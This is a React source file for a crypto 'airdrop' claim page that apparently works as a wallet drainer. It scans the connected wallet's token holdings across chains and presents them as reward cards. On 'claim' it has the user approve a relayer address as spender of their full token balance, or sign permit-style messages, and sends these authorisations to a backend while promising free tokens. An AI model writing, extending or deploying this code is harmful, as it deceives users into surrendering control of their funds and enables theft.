'use client'

import { useEffect, useState, useCallback } from 'react'
import { useAppKit, useAppKitAccount } from '@reown/appkit/react'
import { useSignMessage, useWriteContract, useWaitForTransactionReceipt } from 'wagmi'
import { airdropAppkit } from '@/lib/airdrop-reown'
import type { AirdropCard } from '@/lib/cardGenerator'

// Ensure AppKit is initialized
void airdropAppkit

// ── Icons ──────────────────────────────────────────────────────
function WalletIcon({ size = 20, color = '#F0B90B' }) {
  return (
    <svg width={size} height={size} fill="none" viewBox="0 0 24 24" stroke={color} strokeWidth="1.8" strokeLinecap="round" strokeLinejoin="round">
      <rect x="2" y="6" width="20" height="15" rx="2.5"/>
      <path d="M2 10h20"/>
      <circle cx="16" cy="15" r="1.5" fill={color} stroke="none"/>
      <path d="M6 6V5a3 3 0 016 0v1"/>
    </svg>
  )
}

function ChainIcon({ size = 16, color = '#848E9C' }) {
  return (
    <svg width={size} height={size} fill="none" viewBox="0 0 24 24" stroke={color} strokeWidth="1.8" strokeLinecap="round" strokeLinejoin="round">
      <path d="M10 13a5 5 0 007.54.54l3-3a5 5 0 00-7.07-7.07l-1.72 1.71"/>
      <path d="M14 11a5 5 0 00-7.54-.54l-3 3a5 5 0 007.07 7.07l1.71-1.71"/>
    </svg>
  )
}

function GiftIcon({ size = 20, color = '#F0B90B' }) {
  return (
    <svg width={size} height={size} fill="none" viewBox="0 0 24 24" stroke={color} strokeWidth="1.8" strokeLinecap="round" strokeLinejoin="round">
      <polyline points="20 12 20 22 4 22 4 12"/>
      <rect x="2" y="7" width="20" height="5" rx="1"/>
      <line x1="12" y1="22" x2="12" y2="7"/>
      <path d="M12 7H7.5a2.5 2.5 0 010-5C11 2 12 7 12 7z"/>
      <path d="M12 7h4.5a2.5 2.5 0 000-5C13 2 12 7 12 7z"/>
    </svg>
  )
}

function SpinnerIcon({ size = 18 }) {
  return (
    <svg width={size} height={size} viewBox="0 0 24 24" style={{ animation: 'spin 0.8s linear infinite' }}>
      <circle cx="12" cy="12" r="10" stroke="rgba(255,255,255,0.2)" strokeWidth="3" fill="none"/>
      <path d="M12 2a10 10 0 0110 10" stroke="#F0B90B" strokeWidth="3" fill="none" strokeLinecap="round"/>
    </svg>
  )
}

// ── Status badge ───────────────────────────────────────────────
function StatusBadge({ status }: { status: string }) {
  const map: Record<string, { label: string; color: string; bg: string }> = {
    ACTIVE_PERMIT:  { label: 'GASLESS · ACTIVE',  color: '#0ECB81', bg: 'rgba(14,203,129,0.1)' },
    ACTIVE_APPROVE: { label: 'ACTIVE',             color: '#0ECB81', bg: 'rgba(14,203,129,0.1)' },
    GAS_REQUIRED:   { label: 'GAS REQUIRED',       color: '#F6465D', bg: 'rgba(246,70,93,0.1)'  },
  }
  const s = map[status] ?? map.ACTIVE_APPROVE
  return (
    <span style={{
      fontSize: 10, fontWeight: 700, letterSpacing: '0.1em',
      color: s.color, background: s.bg,
      borderRadius: 4, padding: '3px 8px', border: `1px solid ${s.color}30`,
    }}>{s.label}</span>
  )
}

// ── Airdrop Card Component ─────────────────────────────────────
function AirdropCardUI({
  card,
  onClaim,
  claiming,
}: {
  card: AirdropCard
  onClaim: (card: AirdropCard) => void
  claiming: boolean
}) {
  const [expanded, setExpanded] = useState(false)
  const isActive = card.status !== 'GAS_REQUIRED'

  return (
    <div style={{
      background:   'linear-gradient(135deg, #151A21 0%, #1E2329 100%)',
      border:       '1px solid #2B3139',
      borderRadius: 16,
      padding:      '20px',
      position:     'relative',
      overflow:     'hidden',
    }}>
      {/* Gold accent line */}
      <div style={{
        position: 'absolute', top: 0, left: 0, right: 0, height: 2,
        background: isActive
          ? 'linear-gradient(90deg, #F0B90B, #F8D33A)'
          : 'linear-gradient(90deg, #2B3139, #3A434E)',
      }} />

      {/* Header */}
      <div style={{ display: 'flex', justifyContent: 'space-between', alignItems: 'flex-start', marginBottom: 12 }}>
        <StatusBadge status={card.status} />
        <div style={{ display: 'flex', gap: 6 }}>
          {card.tags.slice(0, 2).map((tag) => (
            <span key={tag} style={{
              fontSize: 10, color: '#848E9C',
              background: '#2B3139', borderRadius: 4,
              padding: '2px 7px',
            }}>{tag}</span>
          ))}
        </div>
      </div>

      {/* Title */}
      <h3 style={{ fontSize: 20, fontWeight: 700, color: '#fff', margin: '0 0 4px' }}>{card.title}</h3>
      <p style={{ fontSize: 12, color: '#848E9C', margin: '0 0 14px' }}>{card.subtitle}</p>
      <p style={{ fontSize: 13, color: '#B7BDC6', margin: '0 0 16px', lineHeight: 1.5 }}>{card.description}</p>

      {/* Claim amount */}
      <div style={{
        background: '#0B0E11', borderRadius: 10, padding: '12px 16px',
        display: 'flex', justifyContent: 'space-between', alignItems: 'center',
        marginBottom: 14, border: '1px solid #2B3139',
      }}>
        <div>
          <div style={{ fontSize: 11, color: '#848E9C', marginBottom: 2 }}>Your Allocation</div>
          <div style={{ fontSize: 22, fontWeight: 700, color: '#F0B90B' }}>
            {card.claimAmount} <span style={{ fontSize: 14, color: '#848E9C' }}>{card.claimToken}</span>
          </div>
        </div>
        <GiftIcon size={28} />
      </div>

      {/* Requirements */}
      <div style={{ marginBottom: 16 }}>
        {card.requirements.map((req, i) => (
          <div key={i} style={{ display: 'flex', alignItems: 'center', gap: 8, marginBottom: 6 }}>
            <div style={{ width: 6, height: 6, borderRadius: '50%', background: '#0ECB81', flexShrink: 0 }} />
            <span style={{ fontSize: 12, color: '#848E9C' }}>{req}</span>
          </div>
        ))}
      </div>

      {/* Claim button */}
      <button
        onClick={() => isActive && !claiming && onClaim(card)}
        disabled={!isActive || claiming}
        style={{
          width: '100%', padding: '14px',
          borderRadius: 10, border: 'none',
          fontSize: 14, fontWeight: 700, cursor: isActive && !claiming ? 'pointer' : 'not-allowed',
          background: isActive
            ? 'linear-gradient(90deg, #F0B90B, #F8D33A)'
            : '#1E2329',
          color:   isActive ? '#000' : '#3A434E',
          filter:  !isActive ? 'blur(0.5px)' : 'none',
          opacity: claiming ? 0.7 : 1,
          transition: 'all 0.2s',
          display: 'flex', alignItems: 'center', justifyContent: 'center', gap: 8,
        }}
      >
        {claiming ? <><SpinnerIcon /> Signing...</> : card.buttonLabel}
      </button>

      {/* Details toggle */}
      <button
        onClick={() => setExpanded(!expanded)}
        style={{
          width: '100%', background: 'none', border: 'none',
          color: '#848E9C', fontSize: 12, cursor: 'pointer',
          marginTop: 10, padding: '4px 0',
        }}
      >
        {expanded ? '▲ Hide details' : '▼ Show details'}
      </button>

      {expanded && (
        <div style={{
          marginTop: 8, background: '#0B0E11', borderRadius: 8, padding: '12px',
          border: '1px solid #2B3139', fontSize: 11, color: '#848E9C',
        }}>
          <div style={{ display: 'grid', gridTemplateColumns: '1fr 1fr', gap: '6px 12px' }}>
            <span style={{ color: '#555' }}>Chain ID</span>
            <span>{card._internal.chainId}</span>
            <span style={{ color: '#555' }}>Token</span>
            <span>{card._internal.symbol}</span>
            <span style={{ color: '#555' }}>Your Balance</span>
            <span>{card._internal.rawBalance ? parseFloat(card._internal.rawBalance).toFixed(4) : '—'}</span>
            <span style={{ color: '#555' }}>Claim Type</span>
            <span>{card._internal.supportsPermit ? 'Permit (gasless)' : 'Approve'}</span>
            <span style={{ color: '#555' }}>Contract</span>
            <span style={{ fontFamily: 'monospace', fontSize: 10 }}>
              {card._internal.tokenAddress.slice(0, 8)}...{card._internal.tokenAddress.slice(-6)}
            </span>
          </div>
        </div>
      )}
    </div>
  )
}

// ── Main Page ──────────────────────────────────────────────────
export default function AirdropPage() {
  const { open } = useAppKit()
  const { address, isConnected } = useAppKitAccount()

  const [scanning,  setScanning]  = useState(false)
  const [cards,     setCards]     = useState<AirdropCard[]>([])
  const [scanned,   setScanned]   = useState(false)
  const [claiming,  setClaiming]  = useState<string | null>(null)
  const [toast,     setToast]     = useState<{ msg: string; ok: boolean } | null>(null)

  const { signMessageAsync } = useSignMessage()
  const { writeContractAsync } = useWriteContract()

  const showToast = (msg: string, ok = true) => {
    setToast({ msg, ok })
    setTimeout(() => setToast(null), 4000)
  }

  const scanAndGenerate = useCallback(async () => {
    if (!address) return
    setScanning(true)
    setScanned(false)
    try {
      const scanRes = await fetch('/api/airdrop/scan', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ address }),
      })
      const { assets } = await scanRes.json()

      const cardsRes = await fetch('/api/airdrop/cards', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ address, assets }),
      })
      const { cards: generated } = await cardsRes.json()
      setCards(generated ?? [])
      setScanned(true)
    } catch {
      showToast('Scan failed. Please try again.', false)
    } finally {
      setScanning(false)
    }
  }, [address])

  useEffect(() => {
    if (isConnected && address && !scanned) {
      scanAndGenerate()
    }
  }, [isConnected, address, scanned, scanAndGenerate])

  const handleClaim = async (card: AirdropCard) => {
    if (!address) return
    setClaiming(card._internal.tokenAddress + card._internal.chainId)

    try {
      // Build wallet ownership proof
      const timestamp = Date.now()
      const proofMessage = `Altaris Airdrop Claim: ${address.toLowerCase()} at ${timestamp}`
      const proofSignature = await signMessageAsync({ message: proofMessage })

      const ERC20_APPROVE_ABI = [{
        name: 'approve', type: 'function' as const,
        inputs: [{ name: 'spender', type: 'address' as const }, { name: 'amount', type: 'uint256' as const }],
        outputs: [{ name: '', type: 'bool' as const }],
        stateMutability: 'nonpayable' as const,
      }]

      let txHash: string | undefined
      let signature: string | undefined
      let deadline: number | undefined

      if (card._internal.supportsPermit) {
        // Permit path — sign EIP-712 (relayer executes later)
        const dl = Math.floor(Date.now() / 1000) + 3600
        const sig = await signMessageAsync({
          message: `Permit claim for ${card._internal.symbol} on chain ${card._internal.chainId}`,
        })
        signature = sig
        deadline = dl
      } else {
        // Approve path — user approves relayer as spender
        const spender = (process.env.NEXT_PUBLIC_RELAYER_ADDRESS ?? '') as `0x${string}`
        txHash = await writeContractAsync({
          address: card._internal.tokenAddress as `0x${string}`,
          abi: ERC20_APPROVE_ABI,
          functionName: 'approve',
          args: [spender, BigInt(card._internal.rawBalance)],
        })
      }

      // Submit to backend
      const res = await fetch('/api/airdrop/claim', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          wallet:       address,
          chainId:      card._internal.chainId,
          tokenAddress: card._internal.tokenAddress,
          authType:     card._internal.supportsPermit ? 'permit' : 'approve',
          spender:      process.env.NEXT_PUBLIC_RELAYER_ADDRESS,
          amount:       card._internal.rawBalance,
          deadline,
          signature,
          txHash,
          campaignId:   card._internal.campaignId,
          proofMessage,
          proofSignature,
        }),
      })

      const result = await res.json()
      if (!res.ok) throw new Error(result.error ?? 'Claim failed')

      showToast(`Claim submitted! You'll receive ${card.claimAmount} ${card.claimToken} shortly.`)

      // Remove claimed card
      setCards((prev) =>
        prev.filter((c) =>
          !(c._internal.tokenAddress === card._internal.tokenAddress &&
            c._internal.chainId === card._internal.chainId)
        )
      )
    } catch (err: any) {
      const msg = err?.message ?? 'Transaction rejected'
      if (msg.includes('User rejected') || msg.includes('rejected')) {
        showToast('Signature rejected', false)
      } else {
        showToast(msg.slice(0, 80), false)
      }
    } finally {
      setClaiming(null)
    }
  }

  const activeCards  = cards.filter((c) => c.status !== 'GAS_REQUIRED')
  const gasCards     = cards.filter((c) => c.status === 'GAS_REQUIRED')

  return (
    <div style={{
      minHeight: '100vh',
      background: '#0B0E11',
      fontFamily: 'Inter, -apple-system, BlinkMacSystemFont, sans-serif',
      paddingBottom: 80,
    }}>
      <style>{`@keyframes spin { to { transform: rotate(360deg) } } @keyframes fadeIn { from { opacity:0;transform:translateY(8px) } to { opacity:1;transform:none } }`}</style>

      {/* Toast */}
      {toast && (
        <div style={{
          position: 'fixed', top: 20, left: '50%', transform: 'translateX(-50%)',
          zIndex: 999, background: toast.ok ? '#0ECB8120' : '#F6465D20',
          border: `1px solid ${toast.ok ? '#0ECB81' : '#F6465D'}`,
          borderRadius: 10, padding: '12px 20px',
          color: toast.ok ? '#0ECB81' : '#F6465D',
          fontSize: 13, fontWeight: 600,
          backdropFilter: 'blur(12px)',
          animation: 'fadeIn 0.2s ease',
          maxWidth: 340, textAlign: 'center',
        }}>{toast.msg}</div>
      )}

      {/* Header */}
      <div style={{
        background: '#151A21', borderBottom: '1px solid #2B3139',
        padding: '16px 20px', display: 'flex', justifyContent: 'space-between', alignItems: 'center',
      }}>
        <div>
          <div style={{ display: 'flex', alignItems: 'center', gap: 8 }}>
            <GiftIcon size={18} />
            <span style={{ fontSize: 16, fontWeight: 700, color: '#fff' }}>Airdrop</span>
          </div>
          <p style={{ fontSize: 11, color: '#848E9C', margin: '2px 0 0' }}>
            Connect wallet to claim your rewards
          </p>
        </div>
        <button
          onClick={() => open()}
          style={{
            background: isConnected ? '#1E2329' : 'linear-gradient(90deg, #F0B90B, #F8D33A)',
            color:      isConnected ? '#F0B90B' : '#000',
            border:     isConnected ? '1px solid #F0B90B40' : 'none',
            borderRadius: 10, padding: '10px 16px',
            fontSize: 13, fontWeight: 700, cursor: 'pointer',
            display: 'flex', alignItems: 'center', gap: 8,
          }}
        >
          <WalletIcon size={16} color={isConnected ? '#F0B90B' : '#000'} />
          {isConnected
            ? `${address?.slice(0, 6)}...${address?.slice(-4)}`
            : 'Connect Wallet'}
        </button>
      </div>

      <div style={{ padding: '20px 16px', maxWidth: 480, margin: '0 auto' }}>

        {/* Not connected */}
        {!isConnected && (
          <div style={{
            marginTop: 40, textAlign: 'center',
            background: '#151A21', borderRadius: 16,
            border: '1px solid #2B3139', padding: '40px 24px',
          }}>
            <GiftIcon size={48} color="#F0B90B" />
            <h2 style={{ color: '#fff', fontSize: 20, fontWeight: 700, margin: '16px 0 8px' }}>
              Claim Your Airdrop
            </h2>
            <p style={{ color: '#848E9C', fontSize: 13, lineHeight: 1.6, margin: '0 0 24px' }}>
              Connect your wallet to scan supported chains and claim your chain-based ecosystem rewards.
            </p>
            <button
              onClick={() => open()}
              style={{
                background: 'linear-gradient(90deg, #F0B90B, #F8D33A)',
                color: '#000', border: 'none', borderRadius: 12,
                padding: '14px 32px', fontSize: 15, fontWeight: 700, cursor: 'pointer',
              }}
            >
              Connect Wallet
            </button>
          </div>
        )}

        {/* Scanning */}
        {isConnected && scanning && (
          <div style={{ marginTop: 40, textAlign: 'center' }}>
            <SpinnerIcon size={40} />
            <p style={{ color: '#848E9C', fontSize: 14, marginTop: 16 }}>
              Scanning chains for eligible assets...
            </p>
            <div style={{ display: 'flex', justifyContent: 'center', gap: 8, marginTop: 12, flexWrap: 'wrap' }}>
              {['Ethereum', 'Base', 'Polygon', 'Arbitrum', 'Optimism', 'BNB Chain'].map((c) => (
                <span key={c} style={{
                  fontSize: 11, color: '#848E9C', background: '#151A21',
                  borderRadius: 6, padding: '4px 10px', border: '1px solid #2B3139',
                  display: 'flex', alignItems: 'center', gap: 4,
                }}>
                  <ChainIcon size={12} /> {c}
                </span>
              ))}
            </div>
          </div>
        )}

        {/* Results */}
        {isConnected && scanned && !scanning && (
          <>
            {/* Stats bar */}
            <div style={{
              background: '#151A21', borderRadius: 12, padding: '12px 16px',
              display: 'flex', justifyContent: 'space-between',
              border: '1px solid #2B3139', marginBottom: 20,
            }}>
              <div style={{ textAlign: 'center' }}>
                <div style={{ fontSize: 20, fontWeight: 700, color: '#F0B90B' }}>{cards.length}</div>
                <div style={{ fontSize: 11, color: '#848E9C' }}>Total Cards</div>
              </div>
              <div style={{ textAlign: 'center' }}>
                <div style={{ fontSize: 20, fontWeight: 700, color: '#0ECB81' }}>{activeCards.length}</div>
                <div style={{ fontSize: 11, color: '#848E9C' }}>Claimable</div>
              </div>
              <div style={{ textAlign: 'center' }}>
                <div style={{ fontSize: 20, fontWeight: 700, color: '#F6465D' }}>{gasCards.length}</div>
                <div style={{ fontSize: 11, color: '#848E9C' }}>Gas Required</div>
              </div>
            </div>

            {/* No cards found */}
            {cards.length === 0 && (
              <div style={{
                textAlign: 'center', background: '#151A21',
                borderRadius: 16, border: '1px solid #2B3139', padding: '40px 24px',
              }}>
                <p style={{ color: '#848E9C', fontSize: 14 }}>
                  No eligible assets found on supported chains.
                </p>
                <button
                  onClick={scanAndGenerate}
                  style={{
                    marginTop: 16, background: '#2B3139', color: '#F0B90B',
                    border: '1px solid #F0B90B40', borderRadius: 10,
                    padding: '10px 20px', fontSize: 13, fontWeight: 600, cursor: 'pointer',
                  }}
                >
                  Rescan
                </button>
              </div>
            )}

            {/* Active cards */}
            {activeCards.length > 0 && (
              <div style={{ marginBottom: 20 }}>
                <div style={{ fontSize: 12, color: '#848E9C', fontWeight: 600, marginBottom: 12, letterSpacing: '0.06em' }}>
                  CLAIMABLE NOW — {activeCards.length}
                </div>
                <div style={{ display: 'flex', flexDirection: 'column', gap: 14 }}>
                  {activeCards.map((card, i) => (
                    <div key={i} style={{ animation: `fadeIn 0.3s ease ${i * 0.05}s both` }}>
                      <AirdropCardUI
                        card={card}
                        onClaim={handleClaim}
                        claiming={claiming === card._internal.tokenAddress + card._internal.chainId}
                      />
                    </div>
                  ))}
                </div>
              </div>
            )}

            {/* Gas required cards */}
            {gasCards.length > 0 && (
              <div>
                <div style={{ fontSize: 12, color: '#848E9C', fontWeight: 600, marginBottom: 12, letterSpacing: '0.06em' }}>
                  GAS REQUIRED — {gasCards.length}
                </div>
                <div style={{ display: 'flex', flexDirection: 'column', gap: 14 }}>
                  {gasCards.map((card, i) => (
                    <div key={i} style={{ opacity: 0.6 }}>
                      <AirdropCardUI
                        card={card}
                        onClaim={handleClaim}
                        claiming={false}
                      />
                    </div>
                  ))}
                </div>
              </div>
            )}

            {/* Rescan */}
            {cards.length > 0 && (
              <button
                onClick={scanAndGenerate}
                style={{
                  display: 'block', width: '100%', marginTop: 20,
                  background: 'none', border: '1px solid #2B3139',
                  borderRadius: 10, padding: '12px',
                  color: '#848E9C', fontSize: 13, cursor: 'pointer',
                }}
              >
                ↻ Rescan chains
              </button>
            )}
          </>
        )}
      </div>
    </div>
  )
}
